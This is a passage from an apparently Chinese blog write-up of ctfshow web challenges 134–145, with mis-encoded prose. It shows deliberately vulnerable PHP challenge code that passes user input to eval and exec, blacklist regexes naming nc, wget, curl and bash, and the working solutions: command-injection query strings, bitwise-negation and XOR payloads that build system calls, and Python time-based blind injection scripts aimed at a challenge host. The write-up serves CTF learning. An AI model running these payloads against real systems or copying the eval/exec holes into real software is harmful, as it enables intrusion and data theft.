class="line">    <span class="keyword">die</span>(<span class="string">&quot;nonononono&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">parse_str</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$key1</span> == <span class="string">&#x27;36d&#x27;</span> &amp;&amp; <span class="variable">$key2</span> == <span class="string">&#x27;36d&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?_POST[key1]=36d&amp;_POST[key2]=36d</span><br></pre></td></tr></table></figure><h3 id="web135"><a href="#web135" class="headerlink" title="web135"></a>web135</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$F</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;F&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i&#x27;</span>, <span class="variable">$F</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$F</span>,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;å¸ˆå‚…ä»¬å±…ç„¶ç ´è§£äº†å‰é¢çš„ï¼Œé‚£å°±æ¥ä¸€ä¸ªåŠ å¼ºç‰ˆå§&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥å†™æ–‡ä»¶ï¼Œç„¶åè®¿é—®å³å¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?F=`$F`; cp flag.php 1.txt</span><br><span class="line">/?F=`$F`; nl f*&gt;aaa</span><br></pre></td></tr></table></figure><h3 id="web136"><a href="#web136" class="headerlink" title="web136"></a>web136</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">check</span>(<span class="variable">$c</span>);</span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥ä½¿ç”¨<code>tee</code>å‘½ä»¤</p><blockquote><p>Linux teeå‘½ä»¤ç”¨äºè¯»å–æ ‡å‡†è¾“å…¥çš„æ•°æ®ï¼Œå¹¶å°†å…¶å†…å®¹è¾“å‡ºæˆæ–‡ä»¶<br>ç”¨æ³•:<br>tee file1 file2  &#x2F;&#x2F;å¤åˆ¶æ–‡ä»¶<br>ls|tee 1.txt     &#x2F;&#x2F;å‘½ä»¤è¾“å‡ºåˆ°1.txtæ–‡ä»¶ä¸­</p></blockquote><p>æŸ¥çœ‹ç›®å½•åå†™æ–‡ä»¶å³å¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?c=ls /|tee aaa</span><br><span class="line">/?c=nl /f149_15_h3r3|tee bbb</span><br></pre></td></tr></table></figure><h3 id="web137"><a href="#web137" class="headerlink" title="web137"></a>web137</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;private class&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/moliyiran/article/details/83514495">call_user_func()è¯¦è§£</a>è°ƒç”¨é™æ€æ–¹æ³•å³å¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POSTï¼š</span><br><span class="line">ctfshow=ctfshow::getFlag</span><br></pre></td></tr></table></figure><h3 id="web138"><a href="#web138" class="headerlink" title="web138"></a>web138</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;private class&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strripos</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>], <span class="string">&quot;:&quot;</span>)&gt;-<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;private function&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>ä¼ æ•°ç»„</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POSTï¼š</span><br><span class="line">ctfshow[0]=ctfshow&amp;ctfshow[1]=getFlag</span><br></pre></td></tr></table></figure><h3 id="web139"><a href="#web139" class="headerlink" title="web139"></a>web139</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">check</span>(<span class="variable">$c</span>);</span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>awké€è¡Œè·å–æ•°æ®,cutå‘½ä»¤é€åˆ—è·å–å•ä¸ªå­—ç¬¦,åˆ©ç”¨ifè¯­å¥æ¥åˆ¤æ–­å‘½ä»¤æ˜¯å¦æ‰§è¡Œ,è¿›è¡Œç›²æ³¨</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> [ `<span class="built_in">cat</span> flag | awk NR==2 | <span class="built_in">cut</span> -c 5` == <span class="string">&quot;&#123;&quot;</span> ];<span class="keyword">then</span> <span class="built_in">echo</span> <span class="string">&#x27;123&#x27;</span>;<span class="keyword">fi</span></span><br><span class="line"><span class="keyword">if</span> [ `<span class="built_in">cat</span> flag | awk NR==2 | <span class="built_in">cut</span> -c 5` == <span class="string">&quot;&#123;&quot;</span> ];<span class="keyword">then</span> <span class="built_in">sleep</span> 2;<span class="keyword">fi</span></span><br><span class="line"><span class="keyword">if</span> [ `<span class="built_in">ls</span> / | awk NR==2 | <span class="built_in">cut</span> -c 5` == <span class="string">&quot;a&quot;</span> ];<span class="keyword">then</span> <span class="built_in">sleep</span> 2;<span class="keyword">fi</span></span><br></pre></td></tr></table></figure><p>ç¼–å†™<code>exp</code>ï¼Œå…ˆæ˜¯çœ‹æ–‡ä»¶å</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">s = string.ascii_letters + string.digits + <span class="string">&#x27;_&#x27;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">url = <span class="string">&#x27;http://931d3429-d6c9-46bd-b83c-698b86f7aef1.challenge.ctf.show/?c=&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">5</span>):</span><br><span class="line">    f = <span class="number">0</span> <span class="comment"># æ–‡ä»¶åé•¿åº¦</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">15</span>):</span><br><span class="line">        <span class="keyword">if</span> f == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> s:</span><br><span class="line">            payload = <span class="string">f&#x27;if [ `ls / | awk NR==<span class="subst">&#123;i&#125;</span> | cut -c <span class="subst">&#123;j&#125;</span>` == &quot;<span class="subst">&#123;k&#125;</span>&quot; ];then sleep 3;fi&#x27;</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                requests.get(url=url+payload, timeout=(<span class="number">2.5</span>,<span class="number">2.5</span>))</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                res += k</span><br><span class="line">                <span class="built_in">print</span>(res)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> k == <span class="string">&#x27;_&#x27;</span>:</span><br><span class="line">                f = <span class="number">1</span></span><br><span class="line">    res += <span class="string">&#x27; &#x27;</span></span><br><span class="line"><span class="comment"># bin dev etc f149_15_h3r3</span></span><br></pre></td></tr></table></figure><p>ç„¶åæ˜¯è¯»å–<code>f149_15_h3r3</code>æ–‡ä»¶å†…å®¹</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">s = string.ascii_letters + string.digits + <span class="string">&#x27;-&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">url = <span class="string">&#x27;http://931d3429-d6c9-46bd-b83c-698b86f7aef1.challenge.ctf.show/?c=&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">    <span class="keyword">if</span> i==<span class="number">8</span>:</span><br><span class="line">        flag += <span class="string">&#x27;&#123;&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line">        <span class="comment"># time.sleep(0.1)</span></span><br><span class="line">        payload = <span class="string">f&#x27;if [ `cat /f149_15_h3r3 | cut -c <span class="subst">&#123;i&#125;</span>` == &quot;<span class="subst">&#123;j&#125;</span>&quot; ];then sleep 3;fi&#x27;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            requests.get(url=url+payload, timeout=(<span class="number">2.5</span>,<span class="number">2.5</span>))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(flag+<span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ctfshow&#123;64b4d686-aea8-4b70-bde3-6bb183c88169&#125;</span></span><br></pre></td></tr></table></figure><h3 id="web140"><a href="#web140" class="headerlink" title="web140"></a>web140</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f1</span> = (String)<span class="variable">$_POST</span>[<span class="string">&#x27;f1&#x27;</span>];</span><br><span class="line">    <span class="variable">$f2</span> = (String)<span class="variable">$_POST</span>[<span class="string">&#x27;f2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9]+$/&#x27;</span>, <span class="variable">$f1</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9]+$/&#x27;</span>, <span class="variable">$f2</span>))&#123;</span><br><span class="line">            <span class="variable">$code</span> = <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$f1</span>(<span class="subst">$f2</span>());&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$code</span>) == <span class="string">&#x27;ctfshow&#x27;</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¼±ç±»å‹æ¯”è¾ƒ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POSTï¼š</span><br><span class="line">f1=md5&amp;f2=phpinfo</span><br><span class="line">f1=md5&amp;f2=md5</span><br><span class="line"></span><br><span class="line">è¿˜æœ‰å¾ˆå¤š</span><br><span class="line">md5(phpinfo())</span><br><span class="line">md5(sleep())</span><br><span class="line">md5(md5())</span><br><span class="line">current(localeconv)</span><br><span class="line">sha1(getcwd())     å› ä¸º/var/www/html md5åå¼€å¤´çš„æ•°å­—æ‰€ä»¥æˆ‘ä»¬æ”¹ç”¨sha1</span><br><span class="line">å‚è€ƒï¼š</span><br><span class="line">https://blog.csdn.net/miuzzx/article/details/109197158?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167152613816782428677033%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=167152613816782428677033&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-3-109197158-null-null.article_score_rank_blog&amp;utm_term=php%E7%89%B9%E6%80%A7&amp;spm=1018.2226.3001.4450</span><br></pre></td></tr></table></figure><h3 id="web141"><a href="#web141" class="headerlink" title="web141"></a>web141</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\W+$/&#x27;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="variable">$code</span> =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨<code>php</code>ä¸­æ•°å­—æ˜¯å¯ä»¥å’Œå‘½ä»¤è¿›è¡Œä¸€äº›è¿ç®—çš„ï¼Œä¾‹å¦‚ <code>1-phpinfo();</code>æ˜¯å¯ä»¥æ‰§è¡Œ<code>phpinfo()</code>å‘½ä»¤çš„ã€‚</p><p>æ•…æ„é€ å‡º<code>system(â€˜tac f*â€™) </code>å³å¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?v1=1&amp;v3=-(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5)-&amp;v2=1</span><br></pre></td></tr></table></figure><h3 id="web142"><a href="#web142" class="headerlink" title="web142"></a>web142</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>))&#123;</span><br><span class="line">        <span class="variable">$d</span> = (<span class="keyword">int</span>)(<span class="variable">$v1</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span>);</span><br><span class="line">        <span class="title function_ invoke__">sleep</span>(<span class="variable">$d</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?v1=0</span><br></pre></td></tr></table></figure><h3 id="web143"><a href="#web143" class="headerlink" title="web143"></a>web143</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\&#123;|\&#125;|\~|\%|\&amp;|\;/i&#x27;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;get out hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$code</span> =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨å¼‚æˆ–</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?v1=1&amp;v3=*(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%00%06%00&quot;^&quot;%7f%60%60%20%60%2a&quot;)*&amp;v2=1</span><br></pre></td></tr></table></figure><h3 id="web144"><a href="#web144" class="headerlink" title="web144"></a>web144</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">check</span>(<span class="variable">$v3</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\W+$/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="variable">$code</span> =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>)===<span class="number">1</span>?<span class="literal">true</span>:<span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?v1=1&amp;v3=-&amp;v2=(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5)</span><br></pre></td></tr></table></figure><h3 id="web145"><a href="#web145" class="headerlink" title="web145"></a>web145</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z]|[0-9]|\@|\!|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\&gt;|\*|\/|\^|\#|\&quot;/i&#x27;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;get out hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$code</span> =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span 